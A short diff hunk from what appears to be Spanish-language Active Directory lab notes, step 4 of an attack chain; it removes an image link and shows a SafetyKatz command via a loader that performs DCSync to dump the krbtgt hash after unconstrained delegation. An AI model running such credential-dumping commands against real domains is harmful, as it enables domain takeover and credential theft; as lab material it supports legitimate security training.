@@ -60,5 +60,3 @@ Paso 4:
 ❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::Evasive-dcsync /user:dcorp\krbtgt" "exit"
 # Ejecutar DCSync con el TGT del DC inyectado para volcar el hash de krbtgt — completa la cadena de Unconstrained Delegation → captura de TGT → DCSync.
 ```
-
-![](Pasted%20image%2020260420180816.png)
